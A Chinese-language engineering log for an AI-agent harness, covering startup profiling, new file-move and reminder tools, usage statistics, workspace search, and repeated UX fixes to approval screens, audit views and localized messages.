全是 < 2ms。**启动成本几乎 100% 是导入**，不是执行。

再按累计耗时看导入树，找到一条不该在启动时存在的链：

```
harness → subagent → tools → tool_documents → document_render
                                          → documents
```

`document_render` 单独导入就是 **118 ms**（shutil 44ms、documents 25ms、zipfile 21ms），
在已加载多数依赖的上下文里仍占 **25.5 ms**。而它只在用户真正渲染文档时才需要。

### 改法

`tool_documents` 里把 `import document_render` / `import documents` 移进各自的函数体。
两个模块的用法都在函数内（`documents.extract_document`、`document_render.render_document`），
所以是纯延迟，不改行为。

**一个连带问题**：`except documents.DocumentError` 在惰性导入后不可用——模块在
`try` 内导入，导入失败时 `except` 子句引用它的名字反而会 `NameError`。改成
`except Exception`，文案本来就只用 `{exc}`，输出不变。

**测试影响**：`monkeypatch.setattr('tool_documents.document_render.render_document', ...)`
会失败（惰性导入后该属性不存在）。改成直接打桩 `document_render.render_document`。
这是惰性导入的固有代价——**打桩面从"经由调用方模块"变成"直接打到目标模块"**，
值得在注释里记一笔。

### 验证

确定性证据（不依赖计时噪声）：

```
启动后 document_render 已加载?  False
导入 tool_documents 后?         False     ← 只在真正渲染时才加载
tool_documents 自身            1.4 ms     ← 原来带着整条链
```

计时（7 次取最小）：**344 ms**（改前 361–380 ms）。

### 剩下的两处，判断为不值得动

| 项 | 耗时 | 为什么不动 |
|---|---|---|
| `yaml` | 32 ms | 由 `llm_config._read_config` 与 `memory._parse_frontmatter` 使用。两者都可延迟，但**一次 `-p` 运行必然会读到记忆**，延迟只是把成本从导入挪到首次使用，总量不变 |
| `dotenv` | 30 ms | `load_dotenv()` 在模块级执行，而所有后续逻辑都依赖 .env 已加载，无法推迟 |

替掉这两者意味着自己写 YAML/.env 解析器——**我们已经在"description 里带冒号"
上栽过一次**，为 62ms 冒静默解析错误的风险不划算。

### 结论

冷启动 361–380 → **344 ms**（约 -30ms）。剩下 62ms 是格式解析库，动它的风险
大于收益。**至此启动优化到此为止**，理由与数据都记在这里，避免以后重复投入。

## 冷启动判断：不需要继续优化（数据支撑，2026-10-28）

### 实测

| 场景 | 端到端 |
|---|---|
| 空 python | 47 ms |
| `harness.py --help` | **469 ms** |
| `harness.py --doctor` | 673 ms |

469ms 里约 **426 ms 是导入**，分布在 **272 个模块**（自研 46 个）。

### 关键：没有单点热点

按**自身耗时**（self，不重复计）排序：

```
  9.7 ms  harness
  7.0 ms  _hashlib
  6.2 ms  yaml.reader
  5.8 ms  struct
  4.1 ms  agent_teams
  3.9 ms  llm_config
  3.6 ms  logging
```

**最大一项不到 10 ms。** 426ms 是分散在 272 个导入上的千刀万剐，不是能一刀切掉的热点。

这否掉两条常见思路：
- 想省 100ms → 得砍掉几十个模块的导入 → 重构，风险远大于收益
- 想延迟导入 → 每个模块只省几 ms → 改动面大、收益分散

### 相对用户实际等待

| 场景 | 启动次数 | 占比 | 值得优化 |
|---|---|---|---|
| 交互 CLI | 1 次/会话 | 一次性，之后每轮模型 ~2s | 否 |
| API / 飞书网关 | 1 次/进程生命周期 | 可忽略 | 否 |
| cron 定时 | 1 次/触发 | 间隔分钟级，占空比 <1% | 否 |
| headless `-p` | 1 次/命令 | **469 / 2469 ≈ 19%** | 边际 |

只有 headless 能感知到，而 19% 附加在一个 2.5 秒的等待上不构成新问题。
469ms 本身也在"感觉流畅"（<1s）区间。

### 唯一明显浪费：`--help` 付 469ms 打印用法

要修需要把 `build_parser()` 抽到不依赖 harness 的模块，再在 `harness.py` 顶部做
快路径（469ms → ~80ms）。但用户一辈子跑几次 `--help`，价值极低，**不做**。

### 结论

**不做通用启动优化。** 将来真出现对应场景再按需处理：

| 触发条件 | 该做的事 |
|---|---|
| 一天几千次 headless | 常驻 worker 摊掉重复启动 |
| `--help` / 参数错误需要秒开 | 抽 `cli_parser.py` + 顶部快路径 |
| 容器冷启是明确痛点 | 才考虑拆导入面 |

### 一个测量教训（差点误判）

第一次测端到端得到"100ms"，差点得出"启动不是问题"的结论。实际是
`entrypoint.py` 直接运行会 `ModuleNotFoundError`（没把 `src` 加进路径）提前退出
——**我量的是失败路径**。真实入口是 `harness.py`（它负责加路径）。

这类"测量对象搞错"比测量误差更危险：误差会让人怀疑数据，而错对象会让人
自信地得出错误结论。以后测任何"启动成本"都要先确认被测进程**真的跑完了**。

## README 收尾：命令表补齐 + 实测数字入档

### 命令表缺口

用脚本对比「`ui.commands.COMMANDS` 注册的命令」与「README 里提到的 `/xxx`」，
发现 **8 个命令完全没写**：

| 命令 | 语义 |
|---|---|
| `/memories` | 记忆开关 / 来源 / 质量评测（之前在记忆章节提过，命令表里没有） |
| `/rules` | 查看用户规则文件 |
| `/domains` | 域名策略（allow 免审 / deny 硬拒） |
| `/audit` | 安全事件查询 |
| `/improvements` | 自我改进会话 / 记录 / 回滚 |
| `/allow`、`/ask`、`/deny` | **会话级工具策略**，优先于档位判定 |
| `/rename`、`/clone`、`/export`、`/clear`、`/hotkeys` | 日常操作 |

`/allow|ask|deny` 最值得补：它们是**安全相关**的会话级覆盖（`/deny` 对该工具是硬拒，
不进审批队列），却在文档里存在感为零。用户不可能用到自己不知道存在的开关。

### 实测数字入档

把 profile 与消融结果写进 README 的「性能统计」一节，让人能看到成本与收益：

- 回合本地开销 **17–30ms**（相对模型 p50 ~2000ms 占 ~1%）
- 召回线性：0.5ms@10 → 22ms@500；注入相对全量省 **69%→99%**
- 常驻内存 **1.9KB/条**；写记忆才增长，不写时 300 轮完全平稳（无泄漏）
- 消融五组：术语表 3/8→8/8、去重 5→1 个文件、两层记忆 3/3→0/3 漏、
  剪枝 21→1 文件、耐心窗口 0/1→1/1

并保留那句必须说清的界限：**消融是机制级的，不证明用户因此受益**——后者要
κ ≥ 0.41 的已校准判官或真实使用数据。

### 加了一条一致性检查（脚本，非测试）

用一次性脚本核对「README 提到的命令 ⊆ 已注册命令」，现在 `仍未覆盖: []`。
没有加成测试：命令表本来就会随功能增删变动，把它钉进 CI 会让"新增命令但还没写
文档"变成阻塞项——那不是我们想要的约束。

## 功能 1：`move_paths` + `undo_moves`（补保护等级倒挂）

### 问题

| 操作 | 保护 |
|---|---|
| `delete_paths` | 回收站、可撤销、逐次审批 |
| `mv` / `move` / `ren` | 走 bash，**不可撤销、无专用工具** |

**更常见的操作（移动）比更危险的操作（删除）保护更弱。** 用户说"把下载文件夹整理
一下"，模型只能拼 bash；一次 `mv` 手误就是文件丢失。

### 三层分工（与删除保持一致）

- `src/moves.py`：怎么移动（校验、冲突检测、执行、撤销日志）
- `src/exec_policy.py`：该不该移动（dry-run 免审，真移动 ASK）
- `src/tool_move.py`：怎么说清楚（预览文案、审计）

### 三条设计决定

**1. 默认 dry-run。** 批量移动手误的代价是文件丢失，而"先看一遍清单"的成本只是
多一次调用。第一次调用返回"将移动 A→B（2 项）"并明确告知下一步怎么执行。

**2. 一项不合格就整批拒绝。** 校验项：源不存在、目标已存在、移进自己的子目录、
跨盘符、重复源、重复目标、超过 50 项。批量执行到一半失败会留下半完成状态，
比干脆失败糟得多。

**3. 撤销从不覆盖。** 目标还在才移回；原位被占用就跳过并报告原因。撤销本身也
不该造成数据丢失。

一个细节：**相对目标路径按源文件所在目录解析**，不是 cwd。这样
`{from: 'a.txt', to: 'old/a.txt'}` 的语义是"在同一文件夹里归到 old/ 子目录"，
符合直觉；按 cwd 解析会让用户以为移到了别处。

### 顺带的策略分层

- `dry_run=True`（默认）→ **ALLOW**：预览不改磁盘，不该逼用户先批一次
- `dry_run=False` → **ASK**：与删除同级，同样可能一次动 50 个文件
- `undo_moves` → **ASK**：比移动本身安全（不覆盖），但也不该默默动盘

### 新增

- 工具：`move_paths`、`undo_moves`（工具数 51 → 53）
- 命令：`/undo-move [batch_id]`（区别于 `/undo`：后者回退对话）
- `tests/test_moves.py`（32 条），覆盖校验全项、批量原子性、撤销不覆盖、
  策略分层、目录移动
- schema 快照同步

全量 **2859 passed / 3 skipped**，ruff 通过。

## 功能 2：`remind` 自然语言提醒

### 缺口

`schedule_cron` 要求 5 段 cron 表达式。个人助手的典型用法是「明天下午三点提醒我
交周报」——让模型翻译 cron 可以，但三处不好：

- 时区/跨月/闰日边界容易错，**错了没人发现**
- 用户看到的确认文案是 `0 15 29 10 *`，**无法验证**自己说的是不是这个意思
- cron 是周期语义，一次性提醒用完还在表里

### 做法

`reminders.py` 只做一件事：把常见说法解析成**绝对本地时间**，并给出人能核对的
回显（"10 月 29 日（周四）15:00（约 1 天后）"）。`tool_remind.remind` 把它变成
一次性 cron 任务（`recurring=False`，触发后自动清理）。

支持的写法：`in 2h` / `30m` / `2026-11-04 15:00` / `15:00` / `明天下午3点` /
`tomorrow 9am` / `今晚8点` / `后天 8:30`。

### 三条设计决定

**1. 只接受能确定的时间。**「晚点」「下周找个时间」直接报错并列出可用写法，
不猜一个——猜错比报错更烦。

**2. 只给时分且已过 → 顺延到明天，但回显说清是哪天。** 下午 4 点说"3 点提醒我"
显然指明天；而回显里带日期，用户能立刻看出理解对不对。

**3. 相对时间在解析时就定死绝对值。** `in 2h` 存成绝对时间，否则进程重启后
相对基准漂移。

### 一个一致性问题（测试抓到的）

`2026-11-04`（只给日期）原本返回 00:00，而 `明天` 返回 09:00——两条路径不一致。
统一为 09:00：字面解释是午夜，但**午夜提醒几乎总是误用**，且回显会写清时间。

### 为什么不做"静态消息直投"

那需要另建一条投递路径（心跳的 outbox 是它专用的）。复用 cron 的代价是触发时
跑一次模型（约 2 秒），换来提醒可带上下文（"顺便，昨天那个任务还没收尾"）。
对个人使用这点成本可接受，而少一条投递路径意味着少一处会不同步的状态。

提醒任务显式 `allow_side_effects=False`：触发时按只读策略执行。

### 新增

工具 `remind`（工具数 53 → 54）、`src/reminders.py`、`src/tool_remind.py`、
`tests/test_reminders.py`（40 条，覆盖相对/绝对/中文/英文/顺延/拒绝/回显/工具层）。
schema 快照同步。

全量 **2898 passed / 3 skipped**（1 个 UI 时序偶发，连跑三次全绿），ruff 通过。

## 功能 3：`/usage` 使用统计聚合

### 为什么这项优先级高

token、工具调用、耗时、审批、记忆写入**都已落在会话事件流里**，但没有任何聚合
视图。更重要的是：**这是判断"记忆/主动性/RSI 到底有没有用"的最小前提**。
没有它，只能不断加机制、永远无法判断。

### 数据来源（全部已有，不新增埋点）

| 维度 | 事件 |
|---|---|
| token | `usage`（prompt / completion / cached / total） |
| 请求耗时 | `usage.request_ms` |
| 工具 | `tool_profile`（tools[].name, duration_ms, status） |
| 回合 | `turn_completed` |
| 审批与记忆 | 审计事件（同一事件流） |

### 真实数据验证

跑本机 22 个会话、30 天窗口：

```
会话 22 · 回合 77 · 模型请求 768
token：输入 35969.3k（其中缓存 32157.3k）· 输出 422.5k · 合计 36391.8k
缓存命中率：89%（缓存 / 输入）
请求耗时：p50 1984ms · p90 5766ms
工具调用（71 批）：
  bash                63 次  均 545ms · 失败 1
  read                 8 次  均 13ms
  grep                 7 次  均 1750ms
  background_output    6 次  均 1713ms
  desktop_snapshot     4 次  均 9970ms
```

这组数字直接确认了之前 profile 的结论：**请求 p50 1984ms 与本地开销无关**（本地
17–30ms，占 1%）。

### 性能：字节预筛（1095ms → 83ms）

第一版全量 json.loads，22 个会话要 **1095ms**——交互命令不能接受。

改用 `audit.py` 已经验证过的做法：在 **bytes** 层预筛，只解码含关心键的行：

```python
_INTERESTING = (b'"usage"', b'"tool_profile"', b'"turn_completed"', ...)
if not any(marker in raw for marker in _INTERESTING):
    continue
```

**1095ms → 83ms（13×）**，结果完全一致。会话里绝大多数是 message / tool_started
行，它们的正文几乎不出现这些键，所以预筛很干净。

### 一个口径问题（写进 docstring 与输出）

**缓存命中率 = cached / prompt（输入），不是 / total**。分母用总数会让命中率
看起来更好看而失去意义。口径含糊的统计比没有统计更容易误导。

### 一个测试抓到的 bug

`sessions` 计数原本依赖 `turn_started`，而它不在预筛列表里——永远数出 0。
改成"有任何被预筛保留的事件就算活跃会话"。

### 新增

- `src/usage_stats.py`、命令 `/usage [天数]`
- `tests/test_usage_stats.py`（16 条，含"缓存命中率分母是输入"与"预筛不能让扫描
  变慢"两条口径/性能断言）

全量 **2915 passed / 3 skipped**，ruff 通过。

## 功能 4：跨工作区联合搜索（`grep scope="workspaces"`）

### 缺口

用户常问「上次那份文档放哪了」「我记得有个文件提到 X，但不确定在哪个项目」。
`grep`/`glob`/`ls` 都接受 `path`，但默认工作区，模型得挨个猜路径。

### 为什么不做全盘扫描

- **性能**：一次检索可能变成几分钟的磁盘遍历，而这是个要秒回的工具
- **隐私**：全盘意味着把用户没让 agent 看过的目录纳进来

所以只搜 `/workspace add` 登记过的目录。这也给用户一个可控边界：**想让它搜，
就登记。**

### 三条约束

1. **只搜登记的目录**，去重、跳过已删除的
2. **总量预算**：默认 60 条命中、4000 个文件。命中够了就停，并明确说明被截断
   ——不为了让结果"完整"而扫到底
3. **按工作区分组返回**，每组带命中数

第 3 条是关键：用户问的是"在**哪个项目**里"，一串没有归属的路径等于没回答。

### 复用而非重写

单工作区搜索直接调 `grep_files`，所以路径分区判定、秘密文件跳过、忽略目录规则
全部一致——没有第二份需要同步的规则。

### 新增

- `src/workspace_search.py`（目标解析 + 分组 + 预算）
- `grep` 增加 `scope: workspace|workspaces` 参数（默认 workspace，行为不变）
- `tests/test_workspace_search.py`（17 条，含预算截断、去重、跳过已删除目录、
  分组输出、无注册表时的下一步提示）

全量 **2932 passed / 3 skipped**，ruff 通过。

## 用户体验完善：实测四处输出后改的五个地方

把四项新功能当用户实际用一遍，逐个看输出。

### 1. `move_paths` 预览被绝对路径淹没（最严重）

实测 6 个文件的预览：

```
  C:\Users\...\Downloads\report-2026-0.pdf -> C:\Users\...\Downloads\archive\report-0.pdf
  C:\Users\...\Downloads\report-2026-1.pdf -> C:\Users\...\Downloads\archive\report-1.pdf
  ...（同一行前缀重复 12 次）
```

**整个屏幕被前缀占满，真正的文件名被挤到行尾——预览的目的就是让人核对，
而这恰好让它不可核对。**

改：算所有 from/to 的**最长公共父目录**，能相对化就相对化：

```
Preview: 6 item(s) would move (nothing changed yet):
  in C:\Users\...\Downloads
  report-2026-0.pdf -> archive/report-0.pdf
  ...
```

跨盘符或没有公共目录时退回绝对路径（不报错）。

### 2. 错误信息没说"一项都没动"

用户看到 "source does not exist" 时第一反应是**"移了一半没有"**。验证是整批
先做的，所以答案总是"没动"——这句话省掉一次恐慌：

```
Error: item 2: source does not exist: ...
Nothing was moved — the whole batch is checked before anything touches the disk.
Fix that item and try again.
```

### 3. 错误文案中英混杂

新工具里 `reminders.py` 用中文错误，而其它所有工具是英文
（`validate_cron` 返回 `Expected 5 fields,got 3`）。混着来最糟。

统一为英文——**但示例保留中文写法**：

```
Error: cannot parse time '晚点'. Usable forms: 2026-11-04 15:00 / 15:00 /
in 2h / tomorrow 9am / 明天下午3点 / 今晚8点
```

理由：模型读英文更稳；而用户是用中文说的时间，**能抄的例子才叫可执行**。

### 4. 错误句里嵌了中文回显

原来：`that time is in the past (1 月 1 日（周一）09:00（已过去）). Give a future time.`
——一句里两个语言，谁读都别扭。

加了 `stamp()` 给错误句用中性格式：

```
that time is in the past (2020-01-01 09:00, now 2026-10-28 14:30).
```

`describe()`（中文友好回显）仍然只用于给用户的确认文案。

### 5. `/usage` 把"有本地数据"误报成"没有数据"

只有工具调用、没有模型请求时，首页判断 `not requests and not turns` 直接
返回"没有可统计的会话"——**而实际有 1 个会话、1 批工具调用**。这会让用户
以为统计坏了。

改成任一维度有数据就出报告。实测现在的输出：

```
使用统计（最近 7 天）
  会话 1 · 回合 0 · 模型请求 0
  工具调用（1 批）：
    bash                      1 次  均 10ms
```

### 6. 撤销失败时列出最近的批次 id

`/improvements rollback` 式的体验问题：报"no move batch with id ghost"却不说
有哪些。现在列出最近 3 个 id，用户能抄对。

### 测试

`test_moves.py` +5（预览相对化、无公共目录回退、整批未动声明、撤销无历史的下一步、
未知批次列最近 id）、`test_reminders.py` +3（英文错误保留中文示例、中性时间戳、
确认文案说明自动清理）、`test_usage_stats.py` +2（本地活动不被报成空、耗时排序）。

全量 **2942 passed / 3 skipped**，ruff 通过。

## UX 打磨（二）：连续撤销、路径一致性、统计口径

第二轮把成功路径也走一遍，找到三个问题——其中两个是**功能对但用户拿不到预期结果**。

### 1. `/undo-move` 连按两次第二次无效（真 bug）

```
第一批：a -> done/a
第二批：b -> done/b
/undo-move  → Restored 1 item(s) (batch 2)     ✓
/undo-move  → Restored 0 item(s) (batch 2)     ✗ 又是同一批
```

用户自然的手势是"再撤一次"，期望继续往前撤。实际它重新选中已撤销的批次，
报告 "Restored 0"。

改：撤销日志保持 append-only，但**追加一条 `{"undone": id}`**；`recent_batches()`
合并这个标记；不带 id 时选**最近一批尚未撤销的**。

现在连按两次会依次撤第二批、第一批。全部撤完后明确说
`every recorded batch has already been undone`。显式点名一个已撤销批次时也直接
说 `has already been undone`，而不是去试一遍再报"文件不见了"。

### 2. 撤销输出没复用路径缩短

移动预览已经相对化，但 `undo()` 自己拼 `f"{from} -> {to}"`，于是撤销时又变成
满屏绝对路径。同一个东西两套格式。

改：撤销直接复用 `moves.describe()`。**一处格式化，两个入口。**

### 3. `/usage` 的两个口径问题（更重要）

**（a）`每回合 10 次模型请求` 是错的。** 我原来用 `turn_completed` 计回合。
实测同一批 30 天会话：

```
用户消息 502 | turn_started 21 | turn_terminal 21 | turn_completed 77 | usage 768
```

三个 turn 事件互相矛盾，而且都远少于用户消息数——说明它们在 schema 演进中
不一致（`turn_started` 是后加的）。

`usage / user 消息 = 1.5`（合理），`usage / turn_terminal = 36.6`（荒谬）。

**决定：不报这个比例。** 口径含糊的统计比没有统计更容易误导——这正是我写在
模块 docstring 里的原则，这里自己违反了。回合数也换成**用户消息数**（唯一跨版本
可靠的计数）。

**（b）按调用次数排看不出时间花在哪。**

```
bash                63 次  均  545ms
desktop_snapshot     4 次  均 9970ms     ← 真正的耗时大头
```

改：每行加**总耗时**，并单列一行按总耗时排：

```
    bash                     63 次  总   34.3s  均    545ms · 失败 1
    desktop_snapshot          4 次  总   39.9s  均   9970ms
  最耗时：desktop_snapshot 39.9s · bash 34.3s · grep 12.2s
```

这一行是真的有用：它直接指出"桌面截图比 63 次 shell 更贵"。

### 测试

`test_moves.py` +5（连续撤销走历史、全部撤完的提示、显式点名已撤销批次、
日志 append-only、undone 标记）；`test_usage_stats.py` +3（不报不可靠比例、
按总耗时排序、行内显示总耗时）。

全量 **2950 passed / 3 skipped**，ruff 通过。

## UX 打磨（三）：扫 `/memories` 与 `/improvements`，发现 GBK 崩溃

### `/memories` 四处

| 问题 | 改法 |
|---|---|
| 归档显示 `0 天前归档`，紧跟"太久没用到"读着像 bug | `今天归档` / `昨天归档` / `N 天前归档` |
| `restore` 失败只说找不到 | 列出可恢复的条目 |
| `why` 找不到不给下一步 | 提示 `/memories` 看全部名称 |
| `why` 结尾说"用 **forget 工具**" | 改成「想删掉它，直接说『忘掉这条』就行」 |

最后一条是**对用户说的功能却用了模型侧措辞**：用户不调工具，他们说话。
让他去做一件做不到的事，等于把话说给了错的人。

`/memories quality` 也补了「设置后用**重启**生效」——原来说"用 X=1 开启"，但那是
环境变量，不重启不生效。

### `/improvements` 发现一个真崩溃

`format_ledger` 用 `✓ ✗ ◐` 做状态标记，在 GBK 控制台上**直接抛
UnicodeEncodeError**：

```
UnicodeEncodeError: 'gbk' codec can't encode character '\u2717'
```

`console.harden_stdio()` 只把流设成 `errors=backslashreplace`——**不崩，但会打印
`\u2717` 这种转义串**，用户看到的是乱码而不是叉号。两种结果都不能接受。

实测 GBK 安全性：`✓` `✗` `◐` `⊘` **全部失败**；`√` `×` `·` `…` `—` `○` `●` 可用。

改：`√`（keep）/ `~`（observe）/ `×`（discard）/ `?`（pending）。

同一问题也在 `background_watch._ICONS`：`✓ ✗ ⊘` → `√ × -`，并且把"只用 GBK
安全字符"写进注释，避免下次又踩。

### 台账原来没记指标变化（更实质的问题）

`format_ledger` 只显示 `指标：round=2`——**内部计轮编号泄漏给用户**，而真正的
前后对比根本没被记录。

`Session.evaluate` 只往台账写 `metric={'round': N}`，测出来的 before/after 全丢了。
翻记录时只能看到"我改了 X"，看不出"改好了多少"——而后者是回头看时**唯一能判断
这次改动值不值的东西**。

改：加 `_metric_snapshot(before, after)`，判定时把每个指标的 `{before, after}` 存进
台账；展示时过滤内部 `round` 字段。现在的输出：

```
  √ 10-28 14:26  去掉重复段
      机制：合并重复段落
      指标：pytest_pass 1 -> 1 · ruff_errors 9 -> 2
      理由：ruff_errors improved
      回滚：/improvements rollback 1793168771-94441a66
```

指标由代码算，不接受模型自述——与台账防污染那条一致。

### 测试

`test_self_improve.py` +3（指标变化可见、隐藏内部 round、标记字符 GBK 安全）。
全量 **2953 passed / 3 skipped**，ruff 通过。

## UX 打磨（四）：/status 与 /audit 的问题

扫 `/status`、`/audit`、`/domains`、`/grants`。`/domains` 没问题（期限与备注都在），
另两个各有两处。

### `/status`：两项被读成相反的意思

**（a）`OS 沙箱：offLLM 审查：放行 0` —— 缺分隔符**

`GATE.judge_summary()` 返回的字符串**不带前置分隔符**，而调用方把它直接拼在
`OS 沙箱：off` 后面。改成由 `judge_summary()` 自己带 ` · ` 前缀——谁返回谁负责，
调用方不用记得补。

**（b）我上一轮加的五项「开」被排在「未启用：」之后**

```
  未启用：桌面控制、浏览器 profile      ← 这里开始是"未启用"列表
    外部内容标记：开（…）              ← 但它们全都是"开"！
    污点出网：开（…）
    审批作用域：仅这一次（…）
```

没有标题，视觉上就是「未启用」列表的延续。**读起来完全反了。**

改成独立一节：

```
  安全与关系：
    · 外部内容标记（web/MCP 结果标注不可信）
    · 污点出网（读过敏感内容后出网强制审批）
    · 审批作用域：仅这一次（HARNESS_APPROVAL_SCOPE）
    · 记忆：读+写（默认）
    · 跨渠道接续（8 小时内的会话自动接上）
```

顺带去掉了与「已启用」列表重复的「不可代做」条目。

**（c）未启用项丢了"怎么开启"**

`_cap()` 在未启用时只留 label，把 detail 丢掉——而那一刻用户最需要的就是
怎么开。改成 `_cap(label, enabled, detail, hint=...)`，未启用时显示 hint：

```
未启用：桌面控制（设 HARNESS_DESKTOP_CONTROL=1）、浏览器 profile（跑 python scripts/browser_setup.py 创建）
```

同时纠正一处语义错配：「浏览器 profile：未启用」不对——它是**未创建**
（还没初始化），不是开关关着。这两个说法会把人引向完全不同的动作。

### `/audit`：事件名是给代码读的

**（a）满屏 `desktop_snapshot_failed` / `policy_denied`**

加了 37 个事件的中文名映射。列表视图显示「策略拒绝」「桌面快照失败」。

但排查时需要原始标识符，所以 `/audit all` 改成对照表：

```
    policy_denied  —  策略拒绝
    desktop_snapshot_failed  —  桌面快照失败
```

两边都查得到。

**（b）`reason` 只对一种事件显示**

`_audit_line` 原来只在 `policy_denied` 时显示 `reason`。但 `AUDIT_EVENTS` 里有
**7 个**事件带 reason 字段（`desktop_snapshot_failed`、`desktop_action_failed`、
`approval_timeout`…）——对它们来说 reason 就是全部信息，丢了只剩一个事件名：

```
10-26 13:57:59 desktop_snapshot_failed        ← 为什么失败？不知道
```

改成任何事件有 reason 就显示。

### `/audit` 还发现一个崩溃

加了 reason 显示后，`/audit` 直接抛 `UnicodeEncodeError`：历史记录里有早期
编码错误写入的 `U+FFFD`（解码替换符），而 GBK 控制台连它都编不了。

**一条乱码记录能让整个命令崩掉。**

加 `_displayable()` 在显示层兜住。第一版兜底写错了：整体 `ascii replace` 会把
中文也变成 `?`，比乱码还糟（用户连带能读的部分一起丢了）。改成
`gbk replace` ——**只替换编不了的那个字**。

再把成串的 `?` 折叠成 `[无法显示]`，否则一行 40 个问号只是噪音：

```
10-26 13:57:59 桌面快照失败  [无法显示] PID[无法显示]
```

原文已经不可恢复（写进去时就是错的编码），显示层只能做到"诚实且不崩"。

### 测试

`test_terminal_views.py` +4（中文标签、all 对照表、任何事件都显示 reason、
乱码历史不崩且 GBK 可编码）。全量 **2953 passed / 3 skipped**。

## UX 打磨（五）：审批面——用户做安全决策的地方

这次扫 `/sessions`、`/workspaces`，但它们不是重点。重点是**审批面**：用户在那里
决定"要不要让它做这件事"，读不懂就等于没有知情同意。

### 新加的四项工具在审批面上是原始 Python dict

```
=== move_paths ===
title:  move_paths
detail: moves=[{'from': 'a.txt', 'to': 'b.txt'}]
```

用户要在这一屏决定"要不要让它移动这些文件"，而我们给他一个 dict repr。

**这是五轮扫描里最严重的一处**：不是"不够友好"，是**无法核对**。

根因是 `approval_view._TOOL_LABELS` 和新一轮的 detail 分支都没跟着加。补上：

| 工具 | 标签 | 内容 |
|---|---|---|
| `move_paths` | 移动/重命名文件 | `移动 2 项：` + 逐条 `a.pdf -> arch/a.pdf` |
| `undo_moves` | 撤销文件移动 | `撤销批次：17931` |
| `remind` | 设置提醒 | `提醒时间：明天下午3点` + `内容：交周报` |
| `remember` | 记住一条 | `记住（偏好）：pref-wed` + 正文 |
| `forget` | 删除一条记忆 | `删除记忆：deploy` |
| `recall` | 查记忆 | `查询记忆：部署` |

几个细节：
- `move_paths` 在 **超过 20 项时折叠**（`… 还有 10 项`）——审批卡片放不下
- `dry_run=false` 时附一句 `（会真的移动文件，可用 /undo-move 撤销）`
- 记忆的 `type=preference` 翻译成「偏好」——审批时看英文枚举没有意义

### 加了一条防回归断言

`test_new_tools_do_not_leak_raw_kwargs`：这些工具的审批面**不能出现**
`moves=` / `batch_id=` 这类原始 kwargs。以后再加重审批的工具，忘了写 detail
分支就会被这条挡住。

### `/sessions` 文本输出

一处小问题：`工作区：工作目录未记录` —— 准确但不可操作。不过这是少数情况
（会话创建时没记录 workspace），且不影响选择，这轮不改。

### 测试

`test_approval_view.py` +10。全量 **2967 passed / 3 skipped**，ruff 通过。

## UX 打磨（六）：/help 的列对齐在飞书上完全失效

扫 `/archive`、`/grants`、`/rules`、`/workspaces`、`/approvals`、`/help`。

`/archive`（候选→确认→逐个报失败）、`/workspaces`、`/approvals` 都没问题。
另三处有问题。

### `/help`：定宽列对齐 + 内部术语

**（a）长用法串和描述粘在一起**

```
  /cache [profile|gc [天数] [--apply]]存储 profile / 工具缓存
                                      ↑ 没有空格
```

`{spec.usage:<28}` 定宽 28，而 `/improvements` 的用法串有 **70 字**——超过宽度的
条目，填充为 0，描述直接贴上去。

**（b）同一个文本也给飞书用**

`help_text()` 被 `feishu_gateway._help_text()` 调用。**飞书是比例字体，列对齐在
那里毫无意义**——固定宽度只会在窄屏上排版崩掉。

改：`column = 24`，超长时把描述换到下一行缩进。终端整齐，飞书也能读。

**（c）表头是内部术语**

```
TUI commands:
Only in line REPL (--ui ansi):
Skills (1):
```

「TUI」「ported」「Only in line REPL」都是实现概念。而且当前 48 个命令**全部
ported**，那个分区根本不会显示——但表头仍然写死为 TUI。

改成中文并说明数量：`命令（48 个）：`、`技能（1）：`。分区名也改成
`只能在文字模式（--ui ansi）用：`。

### `/grants` 空状态：在 `/grants` 里告诉你「用法：/grants（查看）」

```
（没有目录写授权）
用法：/grants（查看）        ← 我们已经在 /grants 里了
```

空状态该回答的是"这东西干什么用、怎么加一条"：

```
（没有目录写授权）
作用：默认档下允许往该目录写改而不逐次审批。
加一条：/grants add "<目录>" [until YYYY-MM-DD] [note 备注]
```

### `/rules` 说明用了内部决策码

```
说明：只作用于 destructive / opaque_command / external_tool 三类询问
```

和 `/audit` 的事件名同一类问题：**这三个是代码里的枚举**，用户读不出自己能影响
什么。改成说清"能改什么、改不动什么"：

```
说明：规则只能决定「本该问你的操作要不要问」——allow 不再问、deny 直接拒。
  改不动：秘密文件、破坏性命令黑名单、执行档位、域名规则、桌面/屏幕/剪贴板工具。
```

这句话也更有用：用户设置 allow 之前最想知道的正是"哪些它管不到"。

### 测试

`test_ui_commands.py` / `test_harness_app.py` 的三处断言随文案更新。
全量 **2967 passed / 3 skipped**，ruff 通过。

## 系统性修复：内部概念泄漏（74 处纯英文 + 若干字段名）

按用户点出的根因（**功能都对，但开发者视角直接暴露给用户**）做了一次系统扫描，
而不是继续零散找。

### 先写扫描器，再修

三版扫描器逐次收敛：

| 版本 | 判据 | 结果 |
|---|---|---|
| 1 | 界面层所有字符串里的 `snake_case` | 229 处，**几乎全是误报**（Textual API 名、docstring） |
| 2 | 只追踪流向 `_notice`/`print`/`Text` 的字符串，排除 docstring | 23 处，多数是有意的诊断/配置引导 |
| 3 | 补两类：**中文界面里整句英文**、**字段名当占位符 / 原始 repr / `key=value`** | **74 处真泄漏** |

关键教训：**第一版扫了个寂寞**。`snake_case` 在代码里到处都是，只有"它会不会
出现在屏幕上"才是判据。

### 最严重的一类：TUI 里 74 处纯英文

```
src/ui/session_actions.py       31 处
src/ui/command_actions.py       10
src/ui/harness_app.py            7
src/ui/session_admin_actions.py  6
src/ui/queue_actions.py          5
模态框 4 个文件                   13
```

TUI 其余文案都是中文，中间夹着：

```
Cannot rename a session while a request is running.
No saved sessions.
Forked to X; message restored to editor.
Unknown skill: nope
Copied 10 non-whitespace chars from the last tool output.
Select transcript text first, or use /copy for the last tool output.
```

全部改成中文。这类文案的读者是**正在对话框里操作的人**，让他切换语言就是让他
切换身份（"我是用户" → "我是调用者"）。

一处连带问题：`_copy_text(text, destination='from the last tool output')` ——
参数本身是英文串，直接拼进中文句就变成
`已复制 10 个字符from the last tool output。`。改成 `destination=''` 默认配
中文兜底，调用方传中文片段。

### 字段名当占位符

```
用法：/improvements rollback <change_id>      → <批次号>（批次号在 /improvements 列表里）
Use /allow <tool>.                            → 用法：/allow <工具名>，例如 /allow web_fetch。
                                                工具名在审批提示里能看到。
No saved sessions.（home=...）                  → 还没有保存的会话。
                                                会话目录：…
                                                数据根目录：…（可用环境变量 HARNESS_HOME 指定）
```

`home=` 这种写法是把内部字段名当标签用——用户不知道 `home` 是什么。

### 加了防回归守卫：`tests/test_ui_copy.py`

